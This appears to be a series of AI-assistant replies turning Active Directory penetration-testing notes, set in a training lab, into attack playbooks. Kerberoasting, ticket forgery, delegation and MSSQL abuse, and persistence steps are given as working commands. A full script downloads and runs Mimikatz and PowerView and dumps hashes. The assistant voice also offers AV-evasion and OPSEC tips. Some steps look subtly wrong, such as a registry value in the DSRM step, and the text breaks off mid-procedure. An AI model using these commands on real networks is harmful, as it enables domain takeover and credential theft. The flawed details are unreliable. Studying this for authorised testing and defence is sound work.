| EDR/AV | Detect anomalous collection patterns or fileless execution |
| Privilege Minimization | Remove unnecessary group memberships or admin rights |
| Audit ACLs and Trusts | Use AD ACL audit tools (PingCastle, BloodHound, ADACLScanner) |
| Log SharpHound usage | Monitor for common flags, DCSync requests, or reflective module import patterns |

------------------------------------------------------------------------

**📊 Risk & Impact Assessment**

| **Vector** | **Severity** | **Impact** |
|----|----|----|
| Full Data Collection (All) | High | May trigger detection systems, but reveals the complete AD structure |
| LoggedOn Collection | Medium | Reveals current user sessions; less detectable |
| ACL Enumeration | Critical | Reveals misconfigurations that lead to domain takeover |
| Delegation Discovery | Critical | Identifies systems/accounts that allow impersonation |

------------------------------------------------------------------------

**✅ OPSEC Tips**

| **Tip** | **Benefit** |
|----|----|
| Avoid -CollectionMethod All in production | Reduces noise and EDR triggers |
| Use -CollectionMethod LoggedOn, ACL, Trusts selectively | Targets only what's necessary |
| Execute via PowerShell Remoting/WMI and store output in memory | Avoids writing to disk |
| Reflectively load SharpHound.ps1 into memory | Evades basic AV detection |

------------------------------------------------------------------------

Would you like a **stealthy red team BloodHound collection script**, or
guidance on using **Neo4j queries to find attack paths** in BloodHound?

### Kerberoasting

Here is a **corrected, organized, and summarized guide** to **Lateral
Movement techniques in Windows and Active Directory Penetration
Testing**, focusing on **Kerberoasting, AS-REP Roasting, Token
Manipulation, and Scheduled Task Execution**, including:

- Tactics, techniques, tools, vulnerabilities

- Risk and workload impact

- Pentest steps and commands

------------------------------------------------------------------------

**🧭 Lateral Movement in Active Directory Penetration Testing**

------------------------------------------------------------------------

**🔓 1. Kerberoasting**

**📌 Tactic & Technique**

- **MITRE ATT&CK:** T1558.003 – Kerberoasting

- Abuses the ability of any authenticated domain user to request service
  tickets (TGS) for SPNs, which are encrypted with the service account's
  password hash.

**🛠️ Tools Used**

- PowerView (Request-SPNTicket)

- Mimikatz (kerberos::list /export)

- Hashcat / tgsrepcrack.py

**⚠️ Vulnerability**

- Weak or guessable passwords for accounts with SPNs

- No pre-authentication or excessive privileges

**🚨 Risk Severity**

- **High**: Allows offline password cracking of service accounts, which
  often run with elevated privileges

**💥 Impact**

- Potential compromise of service accounts leading to domain privilege
  escalation

**🧪 Steps & Commands**

**✅ *Automatic (PowerView)***

\# Request TGS ticket for a known SPN (e.g., MSSQL service)

Request-SPNTicket -SPN "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"

**💥 *Crack the hash (Hashcat)***

hashcat -a 0 -m 13100 hash.txt rockyou.txt --rules

**🛠️ *Manual using .NET and Mimikatz***

\# Request TGS ticket manually

Add-Type -AssemblyName System.IdentityModel

\$krbtgt = New-Object
System.IdentityModel.Tokens.KerberosRequestorSecurityToken("SPN_HERE")

\# Dump the ticket

Invoke-Mimikatz -Command '"kerberos::list /export"'

**🧠 *Crack the TGS with tgsrepcrack***

python tgsrepcrack.py 10k-worst-pass.txt extracted_ticket.kirbi

------------------------------------------------------------------------

**🔐 2. Targeted Kerberoasting by Setting SPNs**

**💣 Requires ACL permissions to modify user attributes:**

Set-DomainObject -Identity supportUser -Set
@{servicePrincipalName="fake/SPN"}

------------------------------------------------------------------------

**🔓 3. AS-REP Roasting**

**📌 Tactic & Technique**

- **MITRE ATT&CK:** T1558.004 – AS-REP Roasting

- Targets users that don’t require Kerberos pre-authentication (UAC flag
  set)

**🛠️ Tools Used**

- PowerView / ASREPRoast.ps1

- Hashcat

**🧪 Steps & Commands**

**✔️ *Enumerate roastable users***

Get-DomainUser -PreauthNotRequired \| select name

**✔️ *Extract AS-REP hash***

Get-ASREPHash -UserName VPN355user

**✔️ *Crack the hash***

hashcat -a 0 -m 18200 hash.txt rockyou.txt --rules

**🛠️ *Targeted roasting (disable preauth flag)***

Set-DomainObject -Identity ControlUser -XOR
@{userAccountControl=4194304}

------------------------------------------------------------------------

**🧪 4. Token Manipulation**

**📌 Tactic & Technique**

- **MITRE ATT&CK:** T1134.001 – Access Token Manipulation

**🛠️ Tools Used**

- Incognito.exe

- Invoke-TokenManipulation

- Cobalt Strike (alternative)

**🚨 Impact**

- Impersonate users who have sessions or tokens on the host, including
  Domain Admins

**🔧 Commands**

**✔️ *Using Incognito (standalone or Meterpreter)***

.\incognito.exe list_tokens -u

.\incognito.exe execute -c "DOMAIN\user" C:\Windows\System32\cmd.exe

**✔️ *PowerShell***

Invoke-TokenManipulation -ShowAll

Invoke-TokenManipulation -ImpersonateUser -Username "DOMAIN\AdminUser"

Invoke-TokenManipulation -CreateProcess "C:\Windows\System32\cmd.exe"

------------------------------------------------------------------------

**🧨 5. Mimikatz Attacks**

**📌 Tactics**

- **Pass-the-Hash**, **Golden Ticket**, **Silver Ticket**

- **MITRE ATT&CK:** T1550.002, T1558.001, T1558.002

**🚨 Risk Severity**

- **Critical**: Full domain compromise

**🧪 Commands**

**🧷 *Overpass-the-Hash (Pass-the-Key)***

sekurlsa::pth /user:Administrator /domain:domain.local
/ntlm:\<NTLMHASH\> /run:cmd.exe

**🪙 *Golden Ticket***

kerberos::golden /user:Administrator /domain:domain.local
/sid:S-1-5-21-XXXX... /krbtgt:\<hash\> /ticket:admin.kirbi

**🥈 *Silver Ticket (specific SPN)***

kerberos::golden /user:svc-account /domain:domain.local /sid:\<SID\>
/rc4:\<NTLM\> /service:cifs /target:server.domain.local
/ticket:silver.kirbi

------------------------------------------------------------------------

**📅 6. Scheduled Task for Remote Execution**

**📌 Technique**

- Lateral movement via scheduled task (schtasks)

- Needs access to Host SPN machine

**🧪 Commands**

**🎯 *Create task remotely as SYSTEM***

schtasks /create /tn "shell" /ru "NT Authority\SYSTEM" /sc once /st
12:00 /tr "cmd.exe /c whoami" /s dcorp-dc.dollarcorp.moneycorp.local

**🎯 *Trigger the task***

schtasks /run /tn "shell" /s dcorp-dc.dollarcorp.moneycorp.local

------------------------------------------------------------------------

**📊 Summary Table**

| **Technique** | **Tool(s)** | **Risk** | **Impact** | **Notes** |
|----|----|----|----|----|
| Kerberoasting | PowerView, Hashcat | High | Cred disclosure | Offline cracking of SPN accounts |
| AS-REP Roasting | ASREPRoast, Hashcat | High | Cred disclosure | Only works if pre-auth is disabled |
| Token Manipulation | Incognito, PowerView | High | Privilege abuse | Hijacks active user tokens |
| Golden/Silver Tickets | Mimikatz | Critical | Domain control | Persistence and full AD control |
| Scheduled Task Exec | schtasks | Medium | Remote exec | Requires access to target |

Would you like a **fully automated PowerShell script** to perform
Kerberoasting and AS-REP roasting, or integrate this into a **custom
lateral movement playbook**?

Here is a **fully automated PowerShell script** that integrates
**Kerberoasting**, **AS-REP Roasting**, and some **initial lateral
movement reconnaissance** into a **custom Active Directory lateral
movement playbook**.

------------------------------------------------------------------------

**🛠️ PowerShell Lateral Movement Automation Script**

\<#

.SYNOPSIS

Active Directory Lateral Movement Tool

.DESCRIPTION

Automates Kerberoasting, AS-REP Roasting, and enumeration of local admin
access.

.AUTHOR

Red Team Operator

\#\>

\# Load PowerView

Invoke-WebRequest -Uri
"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1"
-OutFile "\$env:TEMP\PowerView.ps1"

. "\$env:TEMP\PowerView.ps1"

Write-Host "\[\*\] Running AD lateral movement enumeration..."
-ForegroundColor Cyan

\# 1. Kerberoasting Enumeration

Write-Host "\`n\[+\] Enumerating kerberoastable accounts..."
-ForegroundColor Green

\$kerberoastUsers = Get-DomainUser -SPN \| Select-Object name,
serviceprincipalname

\$kerberoastUsers \| Format-Table

\# 2. Request TGS for each SPN account

Write-Host "\`n\[+\] Requesting TGS tickets..." -ForegroundColor Green

foreach (\$user in \$kerberoastUsers) {

Request-SPNTicket -SPN \$user.serviceprincipalname

}

\# 3. Save output to file for hash cracking

Write-Host "\`n\[+\] Exporting TGS tickets using Mimikatz..."
-ForegroundColor Green

Invoke-WebRequest -Uri
"https://raw.githubusercontent.com/gentilkiwi/mimikatz/master/x64/mimikatz.exe"
-OutFile "\$env:TEMP\mimikatz.exe"

Start-Process "\$env:TEMP\mimikatz.exe" -ArgumentList '"kerberos::list
/export"' -Wait

Write-Host "\`n\[\*\] Use hashcat with mode 13100 to crack the exported
TGS hashes." -ForegroundColor Yellow

\# 4. AS-REP Roasting

Write-Host "\`n\[+\] Looking for AS-REP roastable users..."
-ForegroundColor Green

\$asrepUsers = Get-DomainUser -PreauthNotRequired \| Select-Object name

\$asrepUsers \| Format-Table

\# 5. Dump AS-REP hashes using ASREPRoast

if (\$asrepUsers) {

Write-Host "\[+\] Dumping AS-REP hashes..." -ForegroundColor Green

Invoke-WebRequest -Uri
"https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-ASREPRoast.ps1"
-OutFile "\$env:TEMP\ASREPRoast.ps1"

. "\$env:TEMP\ASREPRoast.ps1"

Get-ASREPHash -OutputFile "\$env:TEMP\asrep_hashes.txt"

Write-Host "\[\*\] AS-REP hashes saved to \$env:TEMP\asrep_hashes.txt"

Write-Host "\[\*\] Use hashcat with mode 18200 to crack AS-REP hashes."
-ForegroundColor Yellow

}

\# 6. Optional: Local Admin Access Enumeration (loud)

Write-Host "\`n\[+\] Enumerating systems with local admin access
(noisy)..." -ForegroundColor Yellow

\$computers = Get-NetComputer -FullData \| Select-Object -ExpandProperty
name

\$computers \| Out-File "\$env:TEMP\targets.txt"

Find-LocalAdminAccess -ComputerFile "\$env:TEMP\targets.txt"

Find-PSRemotingLocalAdminAccess -ComputerFile "\$env:TEMP\targets.txt"

Write-Host "\`n\[✔\] Script completed. Analyze results and begin lateral
movement where possible." -ForegroundColor Cyan

------------------------------------------------------------------------

**🧪 How to Use**

1.  Save this script as Invoke-LateralMovement.ps1.

2.  Run from a domain-joined user context (PowerShell, as low-priv
    user).

3.  Output hashes (\*.kirbi, \*.txt) can be cracked with:

4.  \# Kerberoast

5.  hashcat -m 13100 TGS.hash rockyou.txt --force

6.  

7.  \# AS-REP Roast

8.  hashcat -m 18200 ASREP.hash rockyou.txt --force

------------------------------------------------------------------------

**🔐 Security Detection Considerations**

| **Action**                 | **Detection Strategy**                  |
|----------------------------|-----------------------------------------|
| Get-DomainUser -SPN        | Event ID 4768 (TGT Request)             |
| SPN Ticket Request         | Monitor unusual volume of TGS requests  |
| AS-REP Hash Extraction     | Look for Event ID 4769 failures         |
| Mimikatz Usage             | Command-line signatures, AMSI detection |
| LocalAdmin/WMI Enumeration | Monitor for PowerShell recon scripts    |

------------------------------------------------------------------------

Would you like this modularized into **multiple scripts (Kerberoast.ps1,
ASREP.ps1, Recon.ps1)** or converted into a **C# executable (e.g.,
SharpKerberoast)** for AV evasion?

Here’s a **comprehensive summary and correction** of the tactics,
techniques, tools, and commands for **lateral movement in Windows and
Active Directory penetration testing**, based on your notes and best
practice offensive tradecraft.

------------------------------------------------------------------------

**🔍 Lateral Movement in Active Directory: Summary**

| **Category** | **Technique** |
|----|----|
| Remote Code Execution | WMI, PowerShell Remoting |
| Delegation Exploitation | Unconstrained Delegation, Constrained Delegation, Resource-Based Delegation |
| Identity Impersonation | Ticket Injection (TGT/TGS via Mimikatz/Rubeus) |
| Hash Abuse | NTLM and RC4 hashes for delegation attacks |
| ACL Exploitation | GenericWrite / WriteProperty on computer objects |

------------------------------------------------------------------------

**⚙️ 1. WMI-Based Remote Command Execution**

**✅ Requirements**

- Requires: Host and RPCSS SPNs on the target

- Ports: TCP 135 + High RPC range (default: 49152–65535)

- User needs *local administrator* rights on the target

**🔧 From Windows (PowerShell)**

Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList
"cmd.exe /c whoami" -ComputerName dcorp-dc

**🐧 From Linux (Impacket)**

\# Password auth

impacket-wmiexec dcorp/student355:Password123@172.16.4.101

\# NTLM hash

impacket-wmiexec dcorp/student355@172.16.4.101 -hashes
:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99

------------------------------------------------------------------------

**⚙️ 2. PowerShell Remoting**

**✅ Requirements**

- Services: CIFS, HTTP, and WSMAN SPNs

- Needs local administrator rights and PowerShell Remoting enabled

- Default port: 5985 (HTTP) / 5986 (HTTPS)

**🔧 Commands**

\# Create credential object

\$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText
-Force

\$Cred = New-Object System.Management.Automation.PSCredential
("DOMAIN\User", \$SecPassword)

\# Remote command

Invoke-Command -ComputerName dc.domain.local -ScriptBlock { whoami }
-Credential \$Cred

\# Interactive session

Enter-PSSession -ComputerName dc.domain.local -Credential \$Cred

------------------------------------------------------------------------

**⚙️ 3. Unconstrained Delegation Exploitation**

**🎯 Target**

- Servers with TrustedForDelegation set to True

**🛠️ Steps**

1.  Get administrative access to a server with unconstrained delegation

2.  Wait for users to authenticate to it (e.g., Domain Admins)

3.  Dump tickets using **Mimikatz** or **Rubeus**

**🔧 Commands**

\# Mimikatz

sekurlsa::tickets /export

kerberos::ptt c:\tickets\da.kirbi

\# Rubeus

.\Rubeus.exe klist

.\Rubeus.exe dump /luid:0x1234

.\Rubeus.exe ptt /ticket:doIF...

\# Printer bug to force DC auth

.\MS-RPRN.exe \\victim-server \\domain-controller

------------------------------------------------------------------------

**⚙️ 4. Constrained Delegation Exploitation**

**🎯 Target**

- Accounts or machines with TrustedToAuthForDelegation

- Backend SPNs (e.g., LDAP, MSSQL) listed in msDS-AllowedToDelegateTo

**🔧 Steps and Commands**

\# Get TGT using service account

.\Rubeus.exe asktgt /user:svc_delegate /rc4:\<NTLM\>
/domain:domain.local

\# Impersonate user to a specific service (LDAP, CIFS, etc.)

.\Rubeus.exe s4u /impersonateuser:Administrator /user:svc_delegate
/rc4:\<NTLM\> /domain:domain.local /msdsspn:LDAP/dc.domain.local

------------------------------------------------------------------------

**⚙️ 5. Resource-Based Constrained Delegation (RBCD)**

**🎯 Target**

- Write access to msDS-AllowedToActOnBehalfOfOtherIdentity on a computer
  object

**🔧 Steps and Commands**

\# Create new machine account (PowerMad)

Import-Module .\Powermad.ps1

New-MachineAccount -MachineAccount 'RBCDClient' -Password 'P@ssw0rd!'

\# Set RBCD on target server (PowerView)

\$SD = New-Object Security.AccessControl.RawSecurityDescriptor
-ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;\<SID\>)"

\$SDBytes = New-Object byte\[\] \$SD.BinaryLength

\$SD.GetBinaryForm(\$SDBytes, 0)

Set-DomainObject -Identity 'TARGET-SERVER\$' -Set
@{'msDS-AllowedToActOnBehalfOfOtherIdentity'=\$SDBytes}

\# Exploit using Rubeus

.\Rubeus.exe s4u /user:RBCDClient\$ /rc4:\<NTLM\>
/impersonateuser:Administrator /msdsspn:LDAP/target.domain.local
/domain:domain.local

------------------------------------------------------------------------

**🛠️ Tools Used**

| **Tool**  | **Purpose**                            |
|-----------|----------------------------------------|
| PowerView | AD recon, ACL abuse                    |
| Impacket  | Remote execution, hash passing (Linux) |
| Rubeus    | Ticket abuse, delegation exploitation  |
| Mimikatz  | Credential dump, ticket injection      |
| PowerMad  | Machine account creation for RBCD      |
| MS-RPRN   | Print Spooler coercion (printer bug)   |

------------------------------------------------------------------------

**🛡️ Vulnerabilities Exploited**

| **Technique** | **Vulnerability / Misconfiguration** |
|----|----|
| WMI/PS Remoting | No network segmentation, weak admin credentials |
| Unconstrained Delegation | TrustedForDelegation=True, plaintext TGT exposure |
| Constrained Delegation | Weak service account creds or leaked hashes |
| RBCD | Weak ACLs (GenericWrite, WriteDACL on computer object) |
| Printer Bug (MS-RPRN) | Abuseable print spooler RPC on DC |

------------------------------------------------------------------------

**🚨 Security Risk Severity**

| **Technique** | **Severity** | **Risk Impact** |
|----|----|----|
| WMI Remoting | High | Full code execution on target system |
| PowerShell Remoting | High | Command execution + file transfer (Post-DA access) |
| Unconstrained Delegation | Critical | TGT theft leads to full DA compromise |
| Constrained Delegation | Critical | Domain-wide impersonation |
| RBCD | Critical | Full compromise if writable computer object found |

**🧨 Operational Impact on Workloads**

- **Low user/system disruption**, but:

  - Attacks often **trigger logs/events** (WMI, remoting, ticket
    injection)

  - Mimikatz and Rubeus may trigger **EDR/AV detection**

  - Printer bug causes **spooler connection events** on DC

  - Delegation attacks enable **persistence or lateral movement**

------------------------------------------------------------------------

Would you like a **full PDF or Markdown version** of this report or want
this converted into a **threat matrix format (MITRE ATT&CK style)** for
red/blue teaming reference?

Certainly! Here’s a **corrected and summarized** version of your Windows
and Active Directory (AD) penetration testing section on **Lateral
Movement via Abusing Domain Trust and MSSQL databases** with:

- Tactics, techniques, and strategies

- Tools used

- Vulnerabilities exploited

- Security risk severity and workload impact

- Practical steps and commands

------------------------------------------------------------------------

**Lateral Movement: Abusing Domain Trust and MSSQL**

------------------------------------------------------------------------

**1. Abusing Domain Trust**

**Tactics & Techniques:**

- Exploit trust relationships between domains to escalate privileges or
  move laterally.

- Forge Kerberos tickets (Golden Tickets) using trust account or krbtgt
  hash.

- Use SID History manipulation to impersonate privileged accounts across
  trusted domains.

**Vulnerabilities Exploited:**

- Misconfigured or over-permissive domain trust relationships.

- Compromised Domain Administrator privileges to extract sensitive
  hashes.

- Lack of proper SID filtering in trust configurations.

**Security Risk Severity:**

- **Critical:** Allows full domain compromise across trusted domains.

- May lead to total domain forest takeover.

**Impact on Workload:**

- High impact on confidentiality, integrity, and availability.

- Attacker can dump secrets, create backdoors, or pivot laterally with
  high privileges.

**Required Privileges:**

- Domain Administrator or equivalent access on the source domain.

------------------------------------------------------------------------

**Steps & Commands:**

**A. Using Domain Trust Key**

- Dump hash of the trust account (currentdomain\targetdomain\$) using
  Mimikatz on a Domain Controller (DC):

\# Dump trust account hash (LSADump or DCSync)

mimikatz \# lsadump::lsa /inject

- Forge inter-realm Golden Ticket with Mimikatz, adding the target
  domain's Enterprise Admin SID to SID History:

kerberos::golden /domain:dollarcorp.moneycorp.local
/sid:\<target-domain-SID\> /sidhistory:\<EA-SID\> /user:Administrator
/krbtgt:\<krbtgt-hash\> /ptt

- Alternatively, use Rubeus to request TGS with the forged ticket and
  perform DCSync or scheduled tasks for persistence:

.\Rubeus.exe asktgs /ticket:c:\path\to\ticket.kirbi

------------------------------------------------------------------------

**B. Using krbtgt Hash**

- Extract krbtgt hash via DCSync or LSADump.

- Forge golden ticket with proper SID history to appear as domain
  controllers or enterprise admins.

------------------------------------------------------------------------

**C. Abusing Inter-Forest Trust**

- Use tools like BloodHound and PowerView to find foreign group
  memberships or username reuse.

- Check for disabled SID filtering (TREAT_AS_EXTERNAL) to abuse forest
  trusts like domain trusts.

- Generate TGTs for the foreign forest using trust keys and request
  service tickets with Rubeus to access target domain resources.

Get-DomainForeignGroupMember -Domain corp2.com

- Generate and use tickets similarly as domain trust abuse.

------------------------------------------------------------------------

**2. Abusing MSSQL Databases for Lateral Movement**

**Tactics & Techniques:**

- Exploit linked SQL servers or misconfigured SQL permissions.

- Execute commands remotely on linked servers using xp_cmdshell.

- Use NTLM relay attacks by forcing authentication via stored procedures
  like xp_dirtree.

**Vulnerabilities Exploited:**

- Linked servers with elevated privileges.

- Enabled and unmonitored xp_cmdshell stored procedure.

- SQL accounts with excessive privileges.

**Security Risk Severity:**

- **High to Critical:** Can lead to code execution on domain-joined
  servers and escalation to domain admin.

**Impact on Workload:**

- Potential for undetected lateral movement.

- High risk to database confidentiality and domain infrastructure.

------------------------------------------------------------------------

**Steps & Commands:**

**Enumerate linked SQL servers:**

EXEC sp_linkedservers;

**Run query on linked server:**

SELECT mylogin FROM OPENQUERY("dc01", 'SELECT SYSTEM_USER');

**Enable and use xp_cmdshell on remote linked server:**

EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE') AT dc01;

EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT dc01;

EXEC ('xp_cmdshell ''whoami''') AT dc01;

**Using PowerUpSQL (PowerShell module) to audit and enumerate MSSQL:**

\# Get SQL instances in domain

Get-SQLInstanceDomain \| Get-SQLConnectionTestThreaded

\# Audit MSSQL instance for misconfigurations

Invoke-SQLAudit -Verbose -Instance UFC-SQLDEV

\# Execute query on MSSQL

Get-SQLQuery -Query "SELECT SYSTEM_USER" -Instance UFC-SQLDEV

\# Run OS command if xp_cmdshell enabled

Invoke-SQLOSCmd -Instance devsrv -Command "whoami"

**Force NTLM authentication via xp_dirtree:**

EXEC master..xp_dirtree "\\192.168.49.67\share";

- Use **Impacket ntlmrelayx** to relay captured NTLM hashes for
  privilege escalation:

sudo impacket-ntlmrelayx --no-http-server -smb2support -c "calc.exe"

------------------------------------------------------------------------

**Tools Summary**

| **Tool**       | **Purpose**                                      |
|----------------|--------------------------------------------------|
| **Mimikatz**   | Dump credentials, forge golden tickets           |
| **Rubeus**     | Request Kerberos tickets, relay attacks          |
| **BloodHound** | AD enumeration, trust relationship mapping       |
| **PowerView**  | AD enumeration, foreign group membership hunting |
| **PowerUpSQL** | MSSQL audit, enumeration, and exploitation       |
| **Impacket**   | WMI, SMB execution, NTLM relay attacks           |

------------------------------------------------------------------------

**Summary**

| **Aspect** | **Details** |
|----|----|
| **Risk Severity** | Critical (domain-wide compromise, privilege escalation, lateral movement) |
| **Privilege Required** | Domain Administrator or high privilege in compromised domain |
| **Impact** | Full domain trust abuse leads to lateral movement across domains, DCSync attacks, and code execution |
| **Detection** | Monitor unusual Kerberos ticket usage, SID history manipulations, unusual SQL activity, and unexpected delegation configurations |

------------------------------------------------------------------------

If you'd like, I can also help you craft detailed step-by-step attack
playbooks with detection and mitigation advice for these techniques!

## Lateral Movement

- **Module 2 – Lateral Movement, Domain Privilege Escalation and
  Persistence**

  - Using extracted credentials (e.g., from LSASS)

  - Credential reuse (Pass-the-Hash, Over-Pass-the-Hash)

  - Pivoting via PsExec, WinRM, SMB, RDP

🔸 **Relevant Techniques:**

- Pass-the-Hash, Pass-the-Ticket

- RDP over SOCKS/Proxy

- Exploiting credential residue (e.g., Mimikatz, SharpHound session
  hunting)

# Persistence

- **Disable inactive admin accounts and remove from privileged groups**

  - Removes potential backdoors.

- **Validate scheduled tasks and scripts**

  - Detect persistence mechanisms.

- **Protect admin credentials by ensuring admins only log on to approved
  workstations/servers**

  - Prevents credential theft persistence on non-secure machines.

- **Implement “Protected Users” group**

  - Limits the use of cached credentials, making persistence harder.

Persistence

- Golden Ticket attacks (Kerberos ticket forging)

- Silver and Diamond tickets

- SID History abuse

- DCShadow persistence

- AdminSDHolder abuse

- Skeleton Key malware implants

- SeEnableDelegationPrivilege abuse

- Malicious Security Support Provider (SSP) persistence

- Directory Services Restore Mode (DSRM) persistence

- Group Policy Object (GPO) persistence

- ACL backdoors and Shadow Admins

Persistence techniques enable attackers to maintain access to
compromised Windows systems even after reboots or user logouts. In
Active Directory environments, persistence often involves configuring
auto-start mechanisms that run malicious code under user or system
privileges.

**Common Persistence Techniques**

| **Technique** | **Description** | **Privilege Required** | **Risk Severity** | **Impact** | **Tools & Commands Examples** |
|----|----|----|----|----|----|
| **Startup Folder** | Place malicious binaries/scripts in startup folders to run at user login or system boot | User-level (current user folder); Admin (system-wide folder) | Medium-High | Persistent code execution on login or boot; stealth varies by location | copy, PowerShell |
| **Registry Run Keys** | Add entries to registry keys that launch malware on startup | User (HKCU) or Admin (HKLM) | Medium-High | Runs automatically at login, can run with high privileges | reg add, PowerShell |
| **Scheduled Tasks** | Create scheduled tasks to run payloads at specific times or triggers | Admin | High | Runs with specified privileges; stealthy | schtasks.exe, PowerShell |
| **Windows Services** | Create or modify Windows services to run malware as SYSTEM | Admin | Critical | Runs at boot with SYSTEM privileges; very stealthy | sc.exe, PowerShell |
| **WMI Event Subscription** | Use WMI permanent event consumers for stealthy persistence | Admin | High | Hard to detect, runs even if other persistence removed | PowerShell WMI cmdlets |

------------------------------------------------------------------------

**Startup Folder Persistence (Detailed)**

**Description**

Dropping a malicious executable or script in a startup folder causes it
to automatically run when the user logs in (user folder) or when the
system boots (system-wide folder).

**Common Startup Folder Paths**

| **Scope** | **Path Example** | **Required Privilege** | **Notes** |
|----|----|----|----|
| Current User | C:\Users\\USERNAME\]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup | User | Runs on current user login |
| All Users (System) | C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup | Administrator | Runs as SYSTEM on boot or any login |

**Commands**

- **Add payload to current user startup folder:**

copy C:\path\to\malicious.exe "\$env:APPDATA\Microsoft\Windows\Start
Menu\Programs\Startup\malicious.exe"

- **Add payload to all users startup folder (admin required):**

copy C:\path\to\malicious.exe "C:\ProgramData\Microsoft\Windows\Start
Menu\Programs\Startup\malicious.exe"

- **Verify presence of startup files:**

dir "\$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"

dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

------------------------------------------------------------------------

**Registry Run Key Persistence**

**Description**

Add a registry entry to auto-run malicious payloads on user login.

**Commands**

- **Add run key for current user:**

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v
"Updater" /t REG_SZ /d "C:\Users\Public\malicious.exe" /f

- **Add run key for all users (requires admin):**

reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v
"Updater" /t REG_SZ /d "C:\Windows\System32\malicious.exe" /f

------------------------------------------------------------------------

**Security Risk & Impact**

| **Risk Level** | **Description** |
|----|----|
| Medium | Current user startup persistence affects a single user; useful for maintaining foothold. |
| High | System-wide startup persistence enables execution at system boot, affecting all users. |
| Critical | When combined with privilege escalation (e.g., malicious services), attacker achieves SYSTEM-level persistence, allowing complete control. |

**Impact:**\
Persistent backdoors can enable long-term access, facilitate lateral
movement, data exfiltration, and evade detection if well hidden.

------------------------------------------------------------------------

**Tools Commonly Used**

- **PowerShell**: For scripting persistence setup and verification

- **cmd.exe**: Basic file and registry manipulation

- **Metasploit / Cobalt Strike**: Automated payloads with persistence
  modules

- **Empire, Nishang**: PowerShell persistence frameworks

------------------------------------------------------------------------

Would you like me to also provide detailed persistence techniques for
services, scheduled tasks, and WMI event subscriptions with step-by-step
commands?

## Persistence

- **Module 2 & 3**

  - Forged Golden/Silver Tickets

  - Modifying ACLs for backdoor access (e.g., DCSync rights)

  - Subverting AdminSDHolder, SIDHistory, or ACLs

🔸 **Relevant Techniques:**

- Golden Ticket (forging TGT using krbtgt)

- Silver Ticket (forging TGS for specific services)

- DCSync using Replicate-Directory-Changes

- Persistence through DC shadow, skeleton key

## Domain Persistence

**Persistence** in AD context means maintaining access to the domain
environment—usually as a privileged user—without losing foothold, even
after reboots or credential changes. Persistence often requires **Domain
Administrator (DA)** privileges due to the sensitive nature of
modifications.

------------------------------------------------------------------------

**Tactics, Techniques, and Strategies**

| **Tactic** | **Technique/Strategy** | **Tools/Methods** | **Risk Severity** | **Impact on Workload** |
|----|----|----|----|----|
| Domain Persistence | Skeleton Key Attack | Mimikatz (privilege::debug, misc::skeleton) | Critical | Full domain compromise; all user passwords bypassed temporarily |
| Privilege Escalation | Granting DCSync Rights | PowerView PowerShell (Add-ObjectACL) | High | Allows stealthy credential harvesting |
| Persistence via Local Admin Account (DSRM) | Enable Remote Logon on DSRM Account | Registry edits; use of local admin hash | High | Full DC access with local admin; persistence even after domain password changes |
| Remote Access & Execution | Modifying Security Descriptors for WMI and PS Remoting | Custom PowerShell scripts (Set-RemoteWMI, Set-RemotePSRemoting) | High | Maintain remote execution capability on DCs |
| Backdooring Registry for Hash Retrieval | DAMP Toolkit (Add-RemoteRegBackdoor.ps1) | DAMP toolkit | Critical | Remote dumping of sensitive DC secrets |
| Forest-level Persistence | DCShadow Attack | Mimikatz, PowerView scripts (Set-DCShadowPermissions) | Critical | Invisible AD object manipulation; stealth persistence at forest level |

------------------------------------------------------------------------

**Tools Used**

- **Mimikatz:** Credential dumping, skeleton key, DCShadow

- **PowerView (PowerShell):** AD enumeration and ACL modifications

- **DAMP toolkit:** Registry backdoors for remote secrets retrieval

- **Custom PowerShell scripts:** Set-RemoteWMI.ps1,
  Set-RemotePSRemoting.ps1

- **Windows built-in commands:** Registry edits, remote execution
  commands

------------------------------------------------------------------------

**Vulnerabilities Exploited**

- Weak or misconfigured ACLs allowing unauthorized DCSync

- Enabled remote logon on DSRM accounts (usually disabled)

- Misconfigured WMI and PowerShell Remoting permissions

- Lack of monitoring for DCShadow attack patterns

- Insufficient protection on DC registry hives (SAM, SYSTEM, SECURITY)

------------------------------------------------------------------------

**Security Risk Severity**

- **Critical:** Skeleton Key, DCShadow, registry backdoor attacks enable
  full domain or forest compromise, hard to detect and remediate.

- **High:** Unauthorized DCSync rights and remote execution permissions
  allow stealthy lateral movement and credential harvesting.

- **Medium:** Improperly configured DSRM remote logon and weak ACLs on
  DCs.

------------------------------------------------------------------------

**Impact on Workload**

- Attackers gain persistent, stealthy control of domain controllers.

- Compromise of all users’ credentials (via skeleton key or DCSync).

- Remote code execution on domain controllers.

- Potential for long-term undetected presence leading to further
  privilege escalation or data exfiltration.

------------------------------------------------------------------------

**Step-by-Step Commands and Procedures**

------------------------------------------------------------------------

**1. Skeleton Key Attack on Domain Controller**

Requires **Domain Admin** privileges:

\# In mimikatz interactive session

privilege::debug

misc::skeleton

- This enables a backdoor password (e.g., "mimikatz") valid for all
  domain users.

- Detection: It leaves a memory-only patch, no files on disk.

------------------------------------------------------------------------

**2. Grant DCSync Rights to a User**

Allows user to replicate secrets from DC at will:

Import-Module PowerView.ps1

Add-ObjectACL -TargetDistinguishedName "dc=dollarcorp,dc=com" -Rights
DCSync -PrincipalUserName "attackerUser"

- Check if this user now has DS-Replication-Get-Changes rights.

------------------------------------------------------------------------

**3. Enable Remote Logon for DSRM Admin**

\# On the Domain Controller

New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa"
-Name "CrashOnAuditFail" -Value 0 -PropertyType DWord -Force

\# Use hash dumped via Mimikatz:

